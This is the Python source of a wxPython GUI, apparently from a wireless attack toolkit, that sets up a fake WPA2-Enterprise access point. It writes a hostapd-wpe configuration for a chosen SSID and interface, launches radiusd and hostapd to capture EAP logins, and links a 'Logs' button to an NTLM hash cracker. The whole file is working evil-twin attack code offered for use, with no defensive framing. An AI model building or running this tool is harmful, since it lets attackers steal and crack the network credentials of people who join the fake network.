import os
import os.path
import time
import wx

import wless_commands


class SnifferGUI(wx.Frame):
    def __init__(self, parent, title):
        super(SnifferGUI, self).__init__(parent, title=title, size=(350, 350))

        self.InitUI()
        self.Centre()
        self.Show()

    def InitUI(self):
        panel = wx.Panel(self)
        panel.SetBackgroundColour('#4f5049')

        self.APname = wx.TextCtrl(panel, -1, "Enter the name of Fake AP", size=(250, 30), pos=(10, 20))

        self.nDeviceList = wx.ComboBox(panel, -1, value='Select Attack Interface', size=(200, 30), pos=(10, 115),
                                       choices=wless_commands.get_net_devices())

        self.actionButton = wx.Button(panel, -1, label='Create Fake AP', pos=(10, 210))
        self.stopButton = wx.Button(panel, -1, label='Stop Fake AP', pos=(130, 210))
        self.logButton = wx.Button(panel, -1, label='Logs', pos=(10, 250))

        self.closeButton = wx.Button(panel, -1, label='Close', pos=(130, 250))

        self.myLabel = wx.StaticText(panel, -1, label='', pos=(10, 180))

        self.actionButton.Bind(wx.EVT_BUTTON, self.executeCommand)
        self.stopButton.Bind(wx.EVT_BUTTON, self.stopfakeap)
        self.closeButton.Bind(wx.EVT_BUTTON, self.closeMe)
        self.logButton.Bind(wx.EVT_BUTTON, self.openLogs)

    # ~ self.on_timer()
    def closeMe(self, e):
        self.Close()

    def openLogs(self, e):
        import ntlm_hashes
        ntlm_hashes.launch_ntlm_cracker()

    def stopfakeap(self, e):
        os.system("kill  `ps aux | grep hostapd | head -1 | awk '{print $2}'`")
        os.system("kill  `ps aux | grep radiusd | head -1 | awk '{print $2}'`")

        os.system("kill  `ps aux | grep dnsmasq | head -1 | awk '{print $2}'`")
        wx.MessageBox('Fake SSID is Stopped', 'Info', wx.OK | wx.ICON_INFORMATION)

    def executeCommand(self, e):
        attackInterface = self.nDeviceList.GetValue()
        fakeAPName = self.APname.GetValue()

        self.myLabel.SetLabel("Created Fake AP: " + str(fakeAPName))

        configuration = """interface=%s
driver=nl80211
ssid=%s
country_code=DE
logger_stdout=-1
logger_stdout_level=0
dump_file=/tmp/hostapd.dump
ieee8021x=1
eapol_key_index_workaround=0
own_ip_addr=127.0.0.1
auth_server_addr=127.0.0.1
auth_server_port=1812
auth_server_shared_secret=testing123
auth_algs=3
wpa=2
wpa_key_mgmt=WPA-EAP
channel=6
wpa_pairwise=CCMP
rsn_pairwise=CCMP
""" % (attackInterface, fakeAPName)

        hostapd_conf = open('./Modules/hostapd-wpe.conf', 'wb')
        hostapd_conf.write(configuration)
        hostapd_conf.close()
        os.system("/sbin/ldconfig -v")
        os.system("gnome-terminal -- radiusd -X &")
        os.system("/usr/local/etc/raddb/certs/bootstrap &")
        time.sleep(2)
        os.system("gnome-terminal -- hostapd ./Modules/hostapd-wpe.conf &")
        wx.MessageBox('WPA2 Enterpise attack started', 'Info', wx.OK | wx.ICON_INFORMATION)


# ~ if __name__ == '__main__':

def main():
    app = wx.App(False)
    frame = SnifferGUI(None, 'Fake WPA2 Enterprise AP')
    app.MainLoop()

# ~ main()
